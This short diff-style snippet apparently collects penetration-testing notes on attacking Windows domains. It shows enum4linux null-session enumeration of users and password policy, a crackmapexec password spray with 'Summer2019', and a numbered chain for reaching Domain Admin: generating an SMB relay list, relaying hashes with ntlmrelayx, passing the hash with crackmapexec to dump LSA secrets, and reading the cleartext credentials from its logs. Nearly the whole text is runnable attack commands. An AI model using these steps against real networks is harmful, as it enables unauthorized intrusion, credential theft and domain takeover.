@@ -9,3 +9,15 @@ enum4linux -P 192.168.x.x
 cme smb 192.168.x.x -u users.txt -p Summer2019
 
 [I'm not following. I'm using Null sessions to extract usernames and password policy. Then crackmapexec to log all those users in at once with the password "Summer2019".]
+
+
+
+
+
+How I got Domain Admin today. Relay creds>SAM dump>PTH> read cleartxt
+
+1) cme smb <CIDR> --gen-relay-list smbrelay.txt
+2) http://ntlmrelayx.py -tf smbrelay.txt
+3) Wait for admin hash (500)
+4) cme smb <CIDR> -u username -H NTHASH --lsa
+5) cat /root/.cme/logs/*.secrets |sort -u
